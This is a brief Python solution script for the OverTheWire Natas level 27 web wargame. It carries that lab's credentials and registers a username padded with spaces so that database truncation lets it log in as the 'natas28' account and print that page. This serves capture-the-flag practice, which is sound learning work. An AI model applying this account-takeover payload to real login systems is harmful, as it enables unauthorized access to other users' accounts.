#!/usr/bin/python
import requests, base64, sys, string

# Had to get some external help for this: https://n0j.github.io/2017/07/20/otw-natas-27.html

url = "http://natas27.natas.labs.overthewire.org/?"
auth = ("natas27", "55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ")

chars = string.ascii_letters + string.digits

# Create user with the same name as natas28 with our pass
params = {
    "username": "natas28                                                                     a",
    "password": "asdf"
}
r = requests.get(url, auth=auth, params=params)

# Login with our pass
params["username"] = "natas28"
r = requests.get(url, auth=auth, params=params)

print(r.text)